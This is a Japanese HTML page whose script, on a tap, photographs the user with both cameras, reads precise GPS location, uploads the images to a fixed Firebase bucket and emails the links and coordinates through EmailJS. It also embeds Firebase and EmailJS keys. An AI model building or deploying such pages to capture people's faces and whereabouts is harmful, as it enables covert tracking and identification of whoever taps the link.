<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>カメラ＋位置＋送信</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      padding: 20px;
    }
    .container { max-width: 800px; margin: auto; text-align: center; }
    .touch-area {
      border: 2px dashed rgba(255,255,255,0.3);
      background: rgba(255,255,255,0.1);
      padding: 40px;
      border-radius: 15px;
      margin: 20px 0;
      cursor: pointer;
    }
    .status { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; margin-top: 10px; }
    .log { text-align: left; font-size: 0.9em; max-height: 200px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 8px; margin-top: 10px; white-space: pre-wrap; }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
    import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-storage.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
      authDomain: "picture-storage-906ae.firebaseapp.com",
      projectId: "picture-storage-906ae",
      storageBucket: "picture-storage-906ae.appspot.com",
      messagingSenderId: "134265329367",
      appId: "1:134265329367:web:b94063426b6307f8a8c292",
      measurementId: "G-9CP3F27EMF"
    };

    const app = initializeApp(firebaseConfig);
    const storage = getStorage(app);

    const logBox = document.createElement("div");
    logBox.className = "log";
    document.addEventListener("DOMContentLoaded", () => {
      document.querySelector(".container").appendChild(logBox);
    });

    function log(...args) {
      const msg = `[${new Date().toLocaleTimeString()}] ${args.join(" ")}`;
      console.log(msg);
      logBox.textContent += msg + "\n";
    }

    emailjs.init("cPjKBUm_i6HebDQF7");

    const statusEl = document.getElementById("status");
    const video = document.getElementById("cameraVideo");
    const canvas = document.getElementById("photoCanvas");
    const touchArea = document.getElementById("touchArea");

    let processing = false;

    async function uploadImage(base64, fileName) {
      const storageRef = ref(storage, `images/${fileName}`);
      await uploadString(storageRef, base64, 'data_url');
      const url = await getDownloadURL(storageRef);
      return url;
    }

    function updateStatus(text, color = '') {
      statusEl.textContent = text;
      statusEl.style.background = color || 'rgba(0,0,0,0.4)';
      log("Status:", text);
    }

    async function capturePhotos(facingMode, label) {
      updateStatus(`📸 ${label}カメラ撮影中...`);
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
      video.srcObject = stream;
      video.style.display = 'block';
      await new Promise(r => setTimeout(r, 1000));

      const ctx = canvas.getContext("2d");
      const photos = [];

      for (let i = 0; i < 3; i++) {
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const base64 = canvas.toDataURL("image/jpeg", 0.3);
        photos.push(base64);
        log(`${label} 撮影 ${i + 1} 枚目 サイズ: ${(base64.length * 3 / 4 / 1024).toFixed(1)} KB`);
        await new Promise(r => setTimeout(r, 50));
      }

      stream.getTracks().forEach(t => t.stop());
      video.style.display = 'none';
      return photos;
    }

    async function getLocationInfo() {
      updateStatus("📍 位置情報取得中...");
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const coords = pos.coords;
            const info = {
              lat: coords.latitude,
              lon: coords.longitude,
              acc: coords.accuracy,
              time: new Date(pos.timestamp).toLocaleString()
            };
            log(`位置: 緯度${info.lat}, 経度${info.lon}, 精度${info.acc}m`);
            resolve(info);
          },
          err => reject(err),
          { enableHighAccuracy: true, timeout: 10000 }
        );
      });
    }

    async function runAll() {
      if (processing) {
        updateStatus("❌ 処理中です。二重実行を防止します。", "#f44336");
        return;
      }
      processing = true;
      logBox.textContent = "";

      try {
        updateStatus("🔄 外カメ撮影...");
        const rearPhotos = await capturePhotos("environment", "外カメ");

        updateStatus("🔄 内カメ撮影...");
        const frontPhotos = await capturePhotos("user", "内カメ");

        let location;
        try {
          location = await getLocationInfo();
        } catch (e) {
          location = { lat: "取得失敗", lon: "取得失敗", acc: "不明", time: new Date().toLocaleString() };
          updateStatus("⚠️ 位置情報失敗", "#ffa726");
        }

        updateStatus("☁️ Firebaseに画像アップロード...", "#29b6f6");

        const rearUrls = await Promise.all(rearPhotos.map((p, i) =>
          uploadImage(p, `rear_${Date.now()}_${i}.jpg`)
        ));
        const frontUrls = await Promise.all(frontPhotos.map((p, i) =>
          uploadImage(p, `front_${Date.now()}_${i}.jpg`)
        ));

        updateStatus("✉️ Email送信中...", "#29b6f6");

        const templateParams = {
          photo_rear1_url: rearUrls[0],
          photo_rear2_url: rearUrls[1],
          photo_rear3_url: rearUrls[2],
          photo_front1_url: frontUrls[0],
          photo_front2_url: frontUrls[1],
          photo_front3_url: frontUrls[2],
          location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
          date: new Date().toLocaleString()
        };

        await emailjs.send('service_ja2c09x', 'template_2fp2jrg', templateParams);
        updateStatus("✅ メール送信完了！", "#66bb6a");
      } catch (e) {
        console.error(e);
        updateStatus("❌ 全体処理中にエラー", "#f44336");
        log("エラー詳細:", e?.message || e);
      } finally {
        processing = false;
      }
    }

    document.getElementById("touchArea").addEventListener("click", runAll);
    document.getElementById("touchArea").addEventListener("touchstart", e => {
      e.preventDefault(); runAll();
    }, { passive: false });
  </script>
</head>
<body>
<div class="container">
  <h1>📷 3連写＋位置送信（Firebase経由）</h1>
  <p>外カメ → 内カメ → 位置 → Firebase → EmailJS送信</p>
  <div class="touch-area" id="touchArea">▶️ タップ/クリックして実行</div>
  <div class="status" id="status">待機中</div>
  <video id="cameraVideo" autoplay muted playsinline style="display:none;"></video>
  <canvas id="photoCanvas" style="display:none;"></canvas>
</div>
</body>
</html>
